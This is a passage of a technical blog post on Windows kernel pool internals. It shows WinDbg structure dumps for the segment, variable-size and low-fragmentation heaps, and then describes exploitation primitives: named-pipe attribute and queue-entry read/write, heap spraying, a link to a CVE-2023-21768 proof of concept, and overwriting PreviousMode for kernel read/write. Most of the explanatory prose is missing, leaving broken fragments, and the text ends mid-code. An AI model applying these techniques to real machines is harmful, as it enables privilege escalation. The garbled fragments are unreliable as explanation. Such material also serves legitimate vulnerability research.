NonPagedPoolBaseCacheAligned = <span class="number">0</span>n4</span><br><span class="line">   NonPagedPoolBaseCacheAlignedMustS = <span class="number">0</span>n6</span><br><span class="line">   NonPagedPoolSession = <span class="number">0</span>n32</span><br><span class="line">   PagedPoolSession = <span class="number">0</span>n33</span><br><span class="line">   NonPagedPoolMustSucceedSession = <span class="number">0</span>n34</span><br><span class="line">   DontUseThisTypeSession = <span class="number">0</span>n35</span><br><span class="line">   NonPagedPoolCacheAlignedSession = <span class="number">0</span>n36</span><br><span class="line">   PagedPoolCacheAlignedSession = <span class="number">0</span>n37</span><br><span class="line">   NonPagedPoolCacheAlignedMustSSession = <span class="number">0</span>n38</span><br><span class="line">   NonPagedPoolNx = <span class="number">0</span>n512</span><br><span class="line">   NonPagedPoolNxCacheAligned = <span class="number">0</span>n516</span><br><span class="line">   NonPagedPoolSessionNx = <span class="number">0</span>n544</span><br></pre></td></tr></table></figure><h5 id="Segment-Backend"><a href="#Segment-Backend" class="headerlink" title="Segment Backend"></a>Segment Backend</h5><p>SegAlloc128 KB7 GBVSLFH  </p><p><code>_HEAP_SEG_CONTEXT</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> SegmentMask      : Uint8B</span><br><span class="line">   +<span class="number">0x008</span> UnitShift        : UChar</span><br><span class="line">   +<span class="number">0x009</span> PagesPerUnitShift : UChar</span><br><span class="line">   +<span class="number">0x00a</span> FirstDescriptorIndex : UChar</span><br><span class="line">   +<span class="number">0x00b</span> CachedCommitSoftShift : UChar</span><br><span class="line">   +<span class="number">0x00c</span> CachedCommitHighShift : UChar</span><br><span class="line">   +<span class="number">0x00d</span> Flags            : &lt;anonymous-tag&gt;</span><br><span class="line">   +<span class="number">0x010</span> MaxAllocationSize : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> OlpStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x016</span> MemStatsOffset   : Int2B</span><br><span class="line">   +<span class="number">0x018</span> LfhContext       : Ptr64 Void</span><br><span class="line">   +<span class="number">0x020</span> VsContext        : Ptr64 Void</span><br><span class="line">   +<span class="number">0x028</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x038</span> Heap             : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> SegmentLock      : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> SegmentListHead  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x058</span> SegmentCount     : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> FreePageRanges   : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x070</span> FreeSegmentListLock : Uint8B</span><br><span class="line">   +<span class="number">0x078</span> FreeSegmentList  : [<span class="number">2</span>] _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p>SegmentListHead<code>_HEAP_PAGE_SEGMENT</code>256<code>_HEAP_PAGE_RANGE_DESCRIPTOR</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_HEAP_PAGE_SEGMENT</span><br><span class="line">   +<span class="number">0x000</span> ListEntry        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint8B</span><br><span class="line">   +<span class="number">0x018</span> SegmentCommitState : Ptr64 _HEAP_SEGMENT_MGR_COMMIT_STATE</span><br><span class="line">   +<span class="number">0x020</span> UnusedWatermark  : UChar</span><br><span class="line">   +<span class="number">0x000</span> DescArray        : [<span class="number">256</span>] _HEAP_PAGE_RANGE_DESCRIPTOR</span><br></pre></td></tr></table></figure><p><code>_HEAP_SEG_CONTEXT</code><code>_HEAP_PAGE_SEGMENT</code>Signature<code>_HEAP_PAGE_SEGMEN</code>T</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Signature = Segment ^ SegContext ^ RtlpHpHeapGlobals ^ <span class="number">0xA2E64EADA2E64EAD</span>;</span><br><span class="line"><span class="comment">// SegContext: _HEAP_SEG_CONTEXT</span></span><br><span class="line">Segment = Addr &amp; SegContext-&gt;SegmentMask;</span><br></pre></td></tr></table></figure><h5 id="Variable-Size-Backend"><a href="#Variable-Size-Backend" class="headerlink" title="Variable Size Backend"></a>Variable Size Backend</h5><p>512B128KB<code>_HEAP_VS_CONTEXT</code></p><ul><li><code>_HEAP_VS_CHUNK_FREE_HEADER</code></li><li><code>_HEAP_VS_CHUNK_HEADER</code>headerRtlHpHeapGlobals</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CONTEXT</span><br><span class="line">+<span class="number">0</span> x000 Lock : Uint8B</span><br><span class="line">+<span class="number">0</span> x008 LockType : _RTLP_HP_LOCK_TYPE</span><br><span class="line">+<span class="number">0</span> x010 FreeChunkTree : _RTL_RB_TREE</span><br><span class="line">+<span class="number">0</span> x020 SubsegmentList : _LIST_ENTRY</span><br><span class="line">+<span class="number">0</span> x030 TotalCommittedUnits : Uint8B</span><br><span class="line">+<span class="number">0</span> x038 FreeCommittedUnits : Uint8B</span><br><span class="line">+<span class="number">0</span> x040 DelayFreeContext : _HEAP_VS_DELAY_FREE_CONTEXT</span><br><span class="line">+<span class="number">0</span> x080 BackendCtx : Ptr64 Void</span><br><span class="line">+<span class="number">0</span> x088 Callbacks : _HEAP_SUBALLOCATOR_CALLBACKS</span><br><span class="line">+<span class="number">0</span> x0b0 Config : _RTL_HP_VS_CONFIG</span><br><span class="line">+<span class="number">0</span> x0b4 Flags : Uint4B</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CHUNK_HEADER</span><br><span class="line">+<span class="number">0</span> x000 Sizes : _HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="line">+<span class="number">0</span> x008 EncodedSegmentPageOffset : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">+<span class="number">0</span> x008 UnusedBytes : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">+<span class="number">0</span> x008 SkipDuringWalk : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">+<span class="number">0</span> x008 Spare : Pos <span class="number">10</span>, <span class="number">22</span> Bits</span><br><span class="line">+<span class="number">0</span> x008 AllocatedChunkBits : Uint4B</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="line">+<span class="number">0</span> x000 MemoryCost : Pos <span class="number">0</span>, <span class="number">16</span> Bits</span><br><span class="line">+<span class="number">0</span> x000 UnsafeSize : Pos <span class="number">16</span>, <span class="number">16</span> Bits</span><br><span class="line">+<span class="number">0</span> x004 UnsafePrevSize : Pos <span class="number">0</span>, <span class="number">16</span> Bits</span><br><span class="line">+<span class="number">0</span> x004 Allocated : Pos <span class="number">16</span>, <span class="number">8</span> Bits</span><br><span class="line">+<span class="number">0</span> x000 KeyUShort : Uint2B</span><br><span class="line">+<span class="number">0</span> x000 KeyULong : Uint4B</span><br><span class="line">+<span class="number">0</span> x000 HeaderBits : Uint8B</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_VS_CHUNK_FREE_HEADER</span><br><span class="line">+<span class="number">0</span> x000 Header : _HEAP_VS_CHUNK_HEADER</span><br><span class="line">+<span class="number">0</span> x000 OverlapsHeader : Uint8B</span><br><span class="line">+<span class="number">0</span> x008 Node : _RTL_BALANCED_NODE</span><br></pre></td></tr></table></figure><p><code>_HEAP_VS_CHUNK_HEADER</code>headerRtlHpHeapGlobals</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Chunk-&gt;Sizes = Chunk-&gt;Sizes ^ Chunk ^ RtlpHpHeapGlobals ;</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dq ffff998533f74440 L2</span><br><span class="line">ffff9985`<span class="number">33f</span>74440  <span class="number">88</span>a74e1e`<span class="number">7e507045</span> ffff9985`<span class="number">00000049</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dt _HEAP_VS_CHUNK_HEADER ffff998533f74440</span><br><span class="line">ntdll!_HEAP_VS_CHUNK_HEADER</span><br><span class="line">   +<span class="number">0x000</span> Sizes            : _HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="line">   +<span class="number">0x008</span> EncodedSegmentPageOffset : <span class="number">0</span>y01001001 (<span class="number">0x49</span>)</span><br><span class="line">   +<span class="number">0x008</span> UnusedBytes      : <span class="number">0</span>y0</span><br><span class="line">   +<span class="number">0x008</span> SkipDuringWalk   : <span class="number">0</span>y0</span><br><span class="line">   +<span class="number">0x008</span> Spare            : <span class="number">0</span>y0000000000000000000000 (<span class="number">0</span>)</span><br><span class="line">   +<span class="number">0x008</span> AllocatedChunkBits : <span class="number">0x49</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dx -id <span class="number">0</span>,<span class="number">0</span>,ffff998520ad7080 -<span class="built_in">r1</span> (*((ntdll!_HEAP_VS_CHUNK_HEADER_SIZE *)<span class="number">0xffff998533f74440</span>))</span><br><span class="line">(*((ntdll!_HEAP_VS_CHUNK_HEADER_SIZE *)<span class="number">0xffff998533f74440</span>))                 [Type: _HEAP_VS_CHUNK_HEADER_SIZE]</span><br><span class="line">    [+<span class="number">0x000</span> (<span class="number">15</span>: <span class="number">0</span>)] MemoryCost       : <span class="number">0x7045</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x000</span> (<span class="number">31</span>:<span class="number">16</span>)] UnsafeSize       : <span class="number">0x7e50</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x004</span> (<span class="number">15</span>: <span class="number">0</span>)] UnsafePrevSize   : <span class="number">0x4e1e</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x004</span> (<span class="number">23</span>:<span class="number">16</span>)] Allocated        : <span class="number">0xa7</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x000</span>] KeyUShort        : <span class="number">0x7045</span> [Type: <span class="type">unsigned</span> <span class="type">short</span>]</span><br><span class="line">    [+<span class="number">0x000</span>] KeyULong         : <span class="number">0x7e507045</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x000</span>] HeaderBits       : <span class="number">0x88a74e1e7e507045</span> [Type: <span class="type">unsigned</span> __int64]</span><br></pre></td></tr></table></figure><p>VS<code>_HEAP_VS_CONTXT</code><code>_HEAP_SUBALLOCATOR_CALLBACKS</code><code>RtlpHpVsSubsegmentCreate</code><strong>VSRtlpHpHeapGlobals</strong>  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">callbacks.Allocate = RtlpHpSegVsAllocate;</span><br><span class="line">callbacks.Free = RtlpHpSegLfhVsFree;</span><br><span class="line">callbacks.Commit = RtlpHpSegLfhVsCommit;</span><br><span class="line">callbacks.Decommit = RtlpHpSegLfhVsDecommit;</span><br><span class="line">callbacks.ExtendContext = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h5 id="Low-Fragmentation-Heap-Backend"><a href="#Low-Fragmentation-Heap-Backend" class="headerlink" title="Low Fragmentation Heap Backend"></a>Low Fragmentation Heap Backend</h5><p>Low Fragmentation Heap Backend1B ~ 512 B LFH_HEAP_LFH_CONTEXTLFHbucket</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_LFH_CONTEXT</span><br><span class="line">+<span class="number">0</span> x000 BackendCtx : Ptr64 Void</span><br><span class="line">+<span class="number">0</span> x008 Callbacks : _HEAP_SUBALLOCATOR_CALLBACKS</span><br><span class="line">+<span class="number">0</span> x030 AffinityModArray : Ptr64 UChar</span><br><span class="line">+<span class="number">0</span> x038 MaxAffinity : UChar</span><br><span class="line">+<span class="number">0</span> x039 LockType : UChar</span><br><span class="line">+<span class="number">0</span> x03a MemStatsOffset : Int2B</span><br><span class="line">+<span class="number">0</span> x03c Config : _RTL_HP_LFH_CONFIG</span><br><span class="line">+<span class="number">0</span> x040 BucketStats : _HEAP_LFH_SUBSEGMENT_STATS</span><br><span class="line">+<span class="number">0</span> x048 SubsegmentCreationLock : Uint8B</span><br><span class="line">+<span class="number">0</span> x080 Buckets : [<span class="number">129</span>] Ptr64 _HEAP_LFH_BUCKET</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p><code>_POOL_HEADER</code></p><p>PoolTagPoolType</p><p>ExAllocatePoolWithTag,PoolTypeCacheAligned,,cpu,0x40</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PagedPoolCacheAligned = <span class="number">0</span>n5</span><br><span class="line">NonPagedPoolCacheAligned = <span class="number">0</span>n4</span><br></pre></td></tr></table></figure><p>headers</p><h4 id="Generic-Exploitation"><a href="#Generic-Exploitation" class="headerlink" title="Generic Exploitation"></a>Generic Exploitation</h4><p>NamedPipePagedPoolNonPagedPool</p><h5 id="PipeAttribute"><a href="#PipeAttribute" class="headerlink" title="PipeAttribute"></a>PipeAttribute</h5><p>BigPool: (x644064+)</p><p>PagedPoolPipeAttribute</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeAttribute</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY list;</span><br><span class="line">    <span class="type">char</span> *AttributeName;</span><br><span class="line">    <span class="type">uint64_t</span> AttributeValueSize;</span><br><span class="line">    <span class="type">char</span> *AttributeValue;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>AttributeName</code><code>AttributeValue</code> <code>NtFsControlFile</code><code>0x11003C</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HANDLE read_pipe;</span><br><span class="line">HANDLE write_pipe;</span><br><span class="line"><span class="type">char</span> attribute[] = <span class="string">&quot; attribute_name \00 attribute_value &quot;</span>;</span><br><span class="line"><span class="type">char</span> output[<span class="number">0x100</span>];</span><br><span class="line"><span class="built_in">CreatePipe</span>(read_pipe, write_pipe, <span class="literal">NULL</span>, bufsize);</span><br><span class="line"><span class="built_in">NtFsControlFile</span>(write_pipe,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                &amp;status,</span><br><span class="line">                <span class="number">0x11003C</span>,</span><br><span class="line">                attribute,</span><br><span class="line">                <span class="built_in">sizeof</span>(attribute),</span><br><span class="line">                output,</span><br><span class="line">                <span class="built_in">sizeof</span>(output));</span><br></pre></td></tr></table></figure><p><code>0x110038</code><code>AttributeValue</code><code>AttributeValueSize</code><code>PipeAttribute</code></p><p><code>PipeAttribute</code><code>AttributeValue</code><code>AttributeValueSize</code></p><h5 id="NpFr"><a href="#NpFr" class="headerlink" title="NpFr"></a>NpFr</h5><p>WriteFileNamedPipechunk<code>Irp</code><code>isDataInKernel</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeQueueEntry</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY list;</span><br><span class="line">    IRP *linkedIRP;</span><br><span class="line">    __int64 SecurityClientContext;</span><br><span class="line">    <span class="type">int</span> isDataInKernel;</span><br><span class="line">    <span class="type">int</span> remaining_bytes__;</span><br><span class="line">    <span class="type">int</span> DataSize;</span><br><span class="line">    <span class="type">int</span> field_2C;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pipe</span></span><br><span class="line"><span class="keyword">if</span> (PipeQueueEntry-&gt;isDataAllocated == <span class="number">1</span>)</span><br><span class="line">    data_ptr = (PipeQueueEntry-&gt;linkedIRP-&gt;SystemBuffer);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    data_ptr = PipeQueueEntry-&gt;data;</span><br><span class="line">[...] </span><br><span class="line"><span class="built_in">memmove</span>((<span class="type">void</span> *)(dst_buf + dst_len - cur_read_offset), &amp;data_ptr[PipeQueueEntry-&gt;DataSize - cur_entry_offset], copy_size);</span><br></pre></td></tr></table></figure><h4 id="spray"><a href="#spray" class="headerlink" title="spray"></a>spray</h4><p>sprayspray</p><p>spray<code>lookaside</code>256</p><p>0x200LFHsprayLFH32<code>BlockBitmap</code>32</p><p><code>0x200</code><code>0x10000</code>Variable Sizespray<code>FreeChunkTree</code><code>0x10000</code>VS<code>FreeChunkTree</code><code>FreeChunkTree</code></p><p></p><p><code>lookaside</code>21<code>lookaside</code><code>lookaside</code><code>lookaside</code></p><h4 id="IO-Ring"><a href="#IO-Ring" class="headerlink" title="IO Ring"></a>IO Ring</h4><p>win11</p><p>CVE<a href="https://github.com/Ha0-Y/CVE-2023-21768">CVE-2023-21768 Proof of Concept</a></p><h4 id="PreviousMode"><a href="#PreviousMode" class="headerlink" title="PreviousMode"></a>PreviousMode</h4><p><code>_KTHREAD.PreviousMode</code></p><p> Nt  Zw   PreviousMode  UserMode  </p><p> PreviousMode  KernelMode </p><p> PreviousMode </p><p> PreviousMode  1 NT  Zw PreviousMode PreviousMode  0 () </p><p><code>PreviousMode</code><code>0</code><code>NtWriteVirtualMemory</code>RW</p><ul><li><code>NtReadVirtualMemory</code>  <code>NtWriteVirtualMemory</code> <code>MiReadWriteVirtualMemory</code> NtWriteVirtualMemory </li></ul><h4 id="New"><a href="#New" class="headerlink" title="New"></a>New</h4><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/updating-deprecated-exallocatepool-calls">ExAllocatePool2  ExAllocatePool3 </a>Windows</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DECLSPEC_RESTRICT PVOID <span class="title">ExAllocatePool2</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  POOL_FLAGS Flags,</span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T     NumberOfBytes,</span></span></span><br><span class="line"><span class="params"><span class="function">  ULONG      Tag</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Old code</span></span><br><span class="line">PVOID Allocation = <span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, <span class="number">100</span>, <span class="string">&#x27;abcd&#x27;</span>);</span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(Allocation, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// New code</span></span><br><span class="line">PVOID Allocation = <span class="built_in">ExAllocatePool2</span>(POOL_FLAG_PAGED, <span class="number">100</span>, <span class="string">&#x27;abcd&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="NPFS-SYS"><a href="#NPFS-SYS" class="headerlink" title="NPFS.SYS"></a>NPFS.SYS</h3><p>named pipe file system</p><p><a href="https://bbs.kanxue.com/thread-278483.htm#msg_header_h2_4">Windows</a></p><ul><li>NPFS.SYS<a href="https://doxygen.reactos.org/dir_552a77878df93326bbe516beefdc08b2.html">npfsreactos</a></li></ul><h4 id="DATA-QUEUE-ENTRY"><a href="#DATA-QUEUE-ENTRY" class="headerlink" title="DATA_QUEUE_ENTRY"></a>DATA_QUEUE_ENTRY</h4><p>Queue: </p><p>SecurityContext</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nt!_SECURITY_CLIENT_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> SecurityQos      : _SECURITY_QUALITY_OF_SERVICE</span><br><span class="line">   +<span class="number">0x010</span> ClientToken      : Ptr64 Void</span><br><span class="line">   +<span class="number">0x018</span> DirectlyAccessClientToken : UChar</span><br><span class="line">   +<span class="number">0x019</span> DirectAccessEffectiveOnly : UChar</span><br><span class="line">   +<span class="number">0x01a</span> ServerIsRemote   : UChar</span><br><span class="line">   +<span class="number">0x01c</span> ClientTokenControl : _TOKEN_CONTROL</span><br></pre></td></tr></table></figure><p>EntryType</p><ul><li>Buffered Entries0ReadFile<code>DATA_QUEUE_ENTRY.data</code></li><li>Unbuffered Entries: 1ReadFile<code>DATA_QUEUE_ENTRY.Irp-&gt;AssociatedIrp.SystemBuffer</code></li></ul><p><strong>QuotaInEntry</strong>: </p><ul><li>buffered entries,DataSize0</li><li>unbuffered entries0</li></ul><p><strong>DataSize</strong>: user data</p><p>x: padding</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DATA_QUEUE_ENTRY</span>&#123;</span><br><span class="line">    LIST_ENTRY Queue;   </span><br><span class="line">    _IRP* Irp;</span><br><span class="line">    _SECURITY_CLIENT_CONTEXT* SecurityContext;</span><br><span class="line">    <span class="type">int</span> EntryType;</span><br><span class="line">    <span class="type">int</span> QuotaInEntry;</span><br><span class="line">    <span class="type">int</span> DataSize;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">&#125; DATA_QUEUE_ENTRY,*PDATA_QUEUE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_NP_DATA_QUEUE</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY Queue;</span><br><span class="line">    ULONG QueueState;</span><br><span class="line">    ULONG BytesInQueue;</span><br><span class="line">    ULONG EntriesInQueue;</span><br><span class="line">    ULONG QuotaUsed;</span><br><span class="line">    ULONG ByteOffset;</span><br><span class="line">    ULONG Quota;</span><br><span class="line">&#125; NP_DATA_QUEUE, *PNP_DATA_QUEUE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//nSizepipe</span></span><br><span class="line"><span class="function">BOOL <span class="title">CreatePipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hReadPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hWritePipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 nSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>CreatePipe</code>NP_DATA_QUEUE</p><p>CreatePipenSizepipe,pipeDATA_QUEUE_ENTRY</p><p>,irp,irp,pipe1000,1000,,1000,1000,pipe,.</p><h4 id="npfs-NpAddDataQueueEntry"><a href="#npfs-NpAddDataQueueEntry" class="headerlink" title="npfs!NpAddDataQueueEntry"></a>npfs!NpAddDataQueueEntry</h4><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_FLAG_REQUIRED_START 0x0000000000000001UI64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_FLAG_USE_QUOTA 0x0000000000000001UI64 <span class="comment">// Charge quota</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_FLAG_NON_PAGED 0x0000000000000040UI64 <span class="comment">// Non paged pool NX</span></span></span><br><span class="line"><span class="keyword">if</span> ( !a5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a4 